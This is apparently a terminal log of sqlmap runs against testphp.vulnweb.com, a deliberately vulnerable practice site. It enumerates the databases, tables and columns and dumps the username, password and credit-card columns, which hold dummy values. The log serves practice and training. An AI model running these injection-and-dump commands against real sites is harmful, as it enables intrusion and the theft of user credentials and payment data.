$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
[23:56:38] [INFO] fetching database names
available databases [2]:
[*] acuart
[*] information_schema
[23:56:38] [INFO] fetched data logged to text files under 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 23:56:38 /2025-08-23/
$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
[23:57:48] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists |
| carts |
| categ |
| featured |
| guestbook |
| pictures |
| products |
| users |
+-----------+
[23:57:48] [INFO] fetched data logged to text files under 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 23:57:48 /2025-08-23/
$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns
[23:58:53] [INFO] fetching columns for table 'users' in database 'acuart'
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column | Type |
+---------+--------------+
| address | mediumtext |
| cart | varchar(100) |
| cc | varchar(100) |
| email | varchar(100) |
| name | varchar(100) |
| pass | varchar(100) |
| phone | varchar(100) |
| uname | varchar(100) |
+---------+--------------+
[23:58:56] [INFO] fetched data logged to text files under 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 23:58:56 /2025-08-23/
$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
[00:00:05] [INFO] fetching entries of column(s) 'uname' for table 'users' in database 'acuart'
Database: acuart
Table: users
[1 entry]
+-------+
| uname |
+-------+
| test |
+-------+
[00:00:06] [INFO] table 'acuart.users' dumped to CSV file 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
[00:00:06] [INFO] fetched data logged to text files under 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 00:00:06 /2025-08-24/
$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump
[00:00:46] [INFO] fetching entries of column(s) 'pass' for table 'users' in database 'acuart'
Database: acuart
Table: users
[1 entry]
+------+
| pass |
+------+
| test |
+------+
[00:00:47] [INFO] table 'acuart.users' dumped to CSV file 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
[00:00:47] [INFO] fetched data logged to text files under 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 00:00:47 /2025-08-24/
$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C cc --dump
[00:01:13] [INFO] fetching entries of column(s) 'cc' for table 'users' in database 'acuart'
Database: acuart
Table: users
[1 entry]
+------------------+
| cc |
+------------------+
| 9999888877776666 |
+------------------+
[00:01:15] [INFO] table 'acuart.users' dumped to CSV file 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
[00:01:15] [INFO] fetched data logged to text files under 
'/home/allen/.local/share/sqlmap/output/testphp.vulnweb.com'
[*] ending @ 00:01:15 /2025-08-24/
